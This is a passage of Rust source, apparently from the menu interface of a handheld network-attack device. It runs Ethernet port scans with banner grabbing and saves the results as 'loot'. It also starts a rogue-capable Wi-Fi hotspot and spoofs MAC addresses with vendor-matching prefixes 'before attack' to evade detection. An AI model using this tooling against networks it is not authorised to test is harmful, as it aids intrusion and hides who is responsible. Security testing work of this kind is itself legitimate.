                    &format!("Interface: {}", active_interface),
                    "Link is down / no cable",
                    "",
                    "Plug into a network and",
                    "try again.",
                ]);
            }

            self.show_progress("Ethernet Port Scan", [
                "Scanning target (gateway if unset)",
                "Press Back to cancel",
            ])?;

            let args = EthernetPortScanArgs {
                target: None,       // defaults to gateway
                interface: Some(active_interface.clone()),
                ports: None,        // default common ports
                timeout_ms: 500,
            };
            let cmd = Commands::Ethernet(EthernetCommand::PortScan(args));

            if let Some((_, data)) = self.dispatch_cancellable("Port Scan", cmd, 40)? {
                let target = data
                    .get("target")
                    .and_then(|v| v.as_str())
                    .unwrap_or("unknown");
                let open_ports: Vec<u16> = data
                    .get("open_ports")
                    .and_then(|v| v.as_array())
                    .map(|arr| {
                        arr.iter()
                            .filter_map(|v| v.as_u64().map(|p| p as u16))
                            .collect()
                    })
                    .unwrap_or_default();
                let loot_path = data
                    .get("loot_path")
                    .and_then(|v| v.as_str())
                    .map(|s| s.to_string());
                let banners = data
                    .get("banners")
                    .and_then(|v| v.as_array())
                    .cloned()
                    .unwrap_or_default();

                let mut lines = vec![
                    format!("Target: {}", target),
                    format!("Open: {}", open_ports.len()),
                ];

                if !open_ports.is_empty() {
                    let preview: Vec<String> = open_ports
                        .iter()
                        .take(6)
                        .map(|p| p.to_string())
                        .collect();
                    lines.push(preview.join(", "));
                    if open_ports.len() > 6 {
                        lines.push(format!("+{} more", open_ports.len() - 6));
                    }
                } else {
                    lines.push("No open ports found".to_string());
                }

                if !banners.is_empty() {
                    let mut preview = Vec::new();
                    for b in banners.iter().take(3) {
                        let port = b.get("port").and_then(|v| v.as_u64()).unwrap_or(0);
                        let banner = b
                            .get("banner")
                            .and_then(|v| v.as_str())
                            .unwrap_or("")
                            .chars()
                            .take(40)
                            .collect::<String>();
                        preview.push(format!("{}: {}", port, banner));
                    }
                    lines.push("Banners:".to_string());
                    lines.extend(preview);
                    if banners.len() > 3 {
                        lines.push(format!("+{} more", banners.len() - 3));
                    }
                }

                if let Some(path) = loot_path {
                    lines.push("Saved:".to_string());
                    lines.push(shorten_for_display(&path, 18));
                }

                self.show_message("Port Scan Done", lines)?;
            }
            Ok(())
        }
    }

    /// Manage hotspot (start/stop, randomize credentials)
    fn manage_hotspot(&mut self) -> Result<()> {
        #[cfg(not(target_os = "linux"))]
        {
            return self.show_message("Hotspot", [
                "Hotspot control is available",
                "on Linux targets only.",
            ]);
        }

        #[cfg(target_os = "linux")]
        {
            loop {
                let status = self
                    .core
                    .dispatch(Commands::Hotspot(HotspotCommand::Status))?;
                let data = status.1;
                let running = data
                    .get("running")
                    .and_then(|v| v.as_bool())
                    .unwrap_or(false);
                let current_ssid = data
                    .get("ssid")
                    .and_then(|v| v.as_str())
                    .unwrap_or(&self.config.settings.hotspot_ssid)
                    .to_string();
                let current_password = data
                    .get("password")
                    .and_then(|v| v.as_str())
                    .unwrap_or(&self.config.settings.hotspot_password)
                    .to_string();

                let mut lines = vec![
                    format!("SSID: {}", current_ssid),
                    format!("Password: {}", current_password),
                    "".to_string(),
                    format!("Status: {}", if running { "ON" } else { "OFF" }),
                ];

                let options = if running {
                    lines.push("Turn off to exit this view".to_string());
                    vec!["Turn off hotspot".to_string(), "Refresh".to_string()]
                } else {
                    vec![
                        "Start hotspot".to_string(),
                        "Randomize name".to_string(),
                        "Randomize password".to_string(),
                        "Back".to_string(),
                    ]
                };

                let choice = self.choose_from_list("Hotspot", &options)?;
                match (running, choice) {
                    (true, Some(0)) => {
                        let _ = self
                            .core
                            .dispatch(Commands::Hotspot(HotspotCommand::Stop));
                    }
                    (true, Some(1)) | (true, None) => {
                        continue;
                    }
                    (false, Some(0)) => {
                        // Select interfaces using hardware detect
                        let (_msg, detect) = self
                            .core
                            .dispatch(Commands::Hardware(HardwareCommand::Detect))?;

                        let mut ethernet = Vec::new();
                        if let Some(arr) = detect.get("ethernet_ports").and_then(|v| v.as_array()) {
                            for item in arr {
                                if let Ok(info) = serde_json::from_value::<InterfaceSummary>(item.clone()) {
                                    ethernet.push(info.name);
                                }
                            }
                        }

                        let mut wifi = Vec::new();
                        if let Some(arr) = detect.get("wifi_modules").and_then(|v| v.as_array()) {
                            for item in arr {
                                if let Ok(info) = serde_json::from_value::<InterfaceSummary>(item.clone()) {
                                    wifi.push(info.name);
                                }
                            }
                        }

                        if wifi.is_empty() {
                            return self.show_message("Hotspot", [
                                "No WiFi interface found",
                                "",
                                "Plug in or enable a",
                                "WiFi adapter to host",
                                "the hotspot.",
                            ]);
                        }

                        let upstream_pref = if ethernet.contains(&"eth0".to_string()) {
                            "eth0".to_string()
                        } else {
                            ethernet.first().cloned().unwrap_or_else(|| wifi.first().cloned().unwrap_or_default())
                        };

                        let upstream_options = if ethernet.is_empty() { wifi.clone() } else { ethernet.clone() };
                        let upstream = self.choose_interface_name("Internet (upstream)", &upstream_options)?;
                        let upstream_iface = upstream.unwrap_or(upstream_pref);

                        let ap_iface = self
                            .choose_interface_name("Hotspot WiFi (AP)", &wifi)?
                            .unwrap_or_else(|| wifi.first().cloned().unwrap_or_else(|| "wlan0".to_string()));

                        let args = HotspotStartArgs {
                            ap_interface: ap_iface.clone(),
                            upstream_interface: upstream_iface.clone(),
                            ssid: self.config.settings.hotspot_ssid.clone(),
                            password: self.config.settings.hotspot_password.clone(),
                            channel: 6,
                        };
                        match self.core.dispatch(Commands::Hotspot(HotspotCommand::Start(args)))
                        {
                            Ok((msg, data)) => {
                                let ssid = data
                                    .get("ssid")
                                    .and_then(|v| v.as_str())
                                    .unwrap_or(&self.config.settings.hotspot_ssid)
                                    .to_string();
                                let password = data
                                    .get("password")
                                    .and_then(|v| v.as_str())
                                    .unwrap_or(&self.config.settings.hotspot_password)
                                    .to_string();
                                self.config.settings.hotspot_ssid = ssid.clone();
                                self.config.settings.hotspot_password = password.clone();
                                let config_path = self.root.join("gui_conf.json");
                                let _ = self.config.save(&config_path);

                                self.show_message("Hotspot started", [
                                    msg,
                                    format!("SSID: {}", ssid),
                                    format!("Password: {}", password),
                                    format!("AP: {}", ap_iface),
                                    format!("Upstream: {}", upstream_iface),
                                    "".to_string(),
                                    "Turn off to exit this view".to_string(),
                                ])?;
                            }
                            Err(e) => {
                                self.show_message("Hotspot error", [
                                    "Failed to start hotspot",
                                    &format!("{e}"),
                                ])?;
                            }
                        }
                    }
                    (false, Some(1)) => {
                        #[cfg(target_os = "linux")]
                        {
                            let ssid = rustyjack_wireless::random_ssid();
                            self.config.settings.hotspot_ssid = ssid.clone();
                            let config_path = self.root.join("gui_conf.json");
                            let _ = self.config.save(&config_path);
                            self.show_message("Hotspot", [
                                "SSID updated",
                                &ssid,
                            ])?;
                        }
                    }
                    (false, Some(2)) => {
                        #[cfg(target_os = "linux")]
                        {
                            let pw = rustyjack_wireless::random_password();
                            self.config.settings.hotspot_password = pw.clone();
                            let config_path = self.root.join("gui_conf.json");
                            let _ = self.config.save(&config_path);
                            self.show_message("Hotspot", [
                                "Password updated",
                                &pw,
                            ])?;
                        }
                    }
                    (false, Some(3)) | (false, None) => return Ok(()),
                    _ => return Ok(()),
                }
            }
        }
    }
}

#[cfg(target_os = "linux")]
fn renew_dhcp_and_reconnect(interface: &str) {
    let _ = Command::new("dhclient").args(["-r", interface]).status();
    let _ = Command::new("dhclient").arg(interface).status();
    let _ = Command::new("wpa_cli")
        .args(["-i", interface, "reconnect"])
        .status();
    let _ = Command::new("nmcli")
        .args(["device", "reconnect", interface])
        .status();
}

#[cfg(target_os = "linux")]
fn generate_vendor_aware_mac(interface: &str) -> anyhow::Result<rustyjack_evasion::MacAddress> {
    use rustyjack_evasion::{MacAddress, VendorOui};

    let current = std::fs::read_to_string(format!("/sys/class/net/{}/address", interface))
        .ok()
        .and_then(|s| MacAddress::parse(s.trim()).ok());

    if let Some(mac) = current {
        if let Some(vendor) = VendorOui::from_oui(mac.oui()) {
            let mut candidate = MacAddress::random_with_oui(vendor.oui)?;
            let mut bytes = *candidate.as_bytes();
            // Preserve vendor flavor but force locally administered + unicast bits
            bytes[0] = (bytes[0] | 0x02) & 0xFE;
            candidate = MacAddress::new(bytes);
            return Ok(candidate);
        }
    }

    Ok(MacAddress::random()?)
}

#[cfg(target_os = "linux")]
fn randomize_mac_with_reconnect(interface: &str) -> anyhow::Result<rustyjack_evasion::MacState> {
    use rustyjack_evasion::MacManager;

    let mut manager = MacManager::new().context("creating MacManager")?;
    manager.set_auto_restore(false);

    let new_mac = generate_vendor_aware_mac(interface)?;
    let state = manager
        .set_mac(interface, &new_mac)
        .context("setting randomized MAC")?;

    renew_dhcp_and_reconnect(interface);
    Ok(state)
}

fn shorten_for_display(value: &str, max_len: usize) -> String {
    if value.len() <= max_len {
        return value.to_string();
    }
    if max_len <= 3 {
        return value[..max_len.min(value.len())].to_string();
    }
    let keep = max_len - 3;
    let prefix = keep / 2;
    let suffix = keep - prefix;
    let start = &value[..prefix.min(value.len())];
    let end = &value[value.len().saturating_sub(suffix)..];
    format!("{start}...{end}")
}

/// Auto-randomize MAC before attack if enabled in settings
/// Returns true if MAC was randomized (so caller knows to restore later)
pub fn auto_randomize_mac_if_enabled(interface: &str, settings: &crate::config::SettingsConfig) -> bool {
    if !settings.mac_randomization_enabled {
        return false;
    }

    #[cfg(target_os = "linux")]
    {
        randomize_mac_with_reconnect(interface).is_ok()
    }

    #[cfg(not(target_os = "linux"))]
    {
        false
    }
}

/// Restore original MAC from saved settings
pub fn restore_original_mac(interface: &str, original_mac: &str) -> bool {
    if original_mac.is_empty() {
        return false;
    }
    
    let _ = std::process::Command::new("ip")
        .args(["link", "set", interface, "down"])
        .output();
    
    let result = std::process::Command::new("ip")
        .args(["link", "set", interface, "address", original_mac])
        .output();
    
    let _ = std::process::Command::new("ip")
        .args(["link", "set", interface, "up"])
        .output();
    
    result.map(|o| o.status.success()).unwrap_or(false)
}
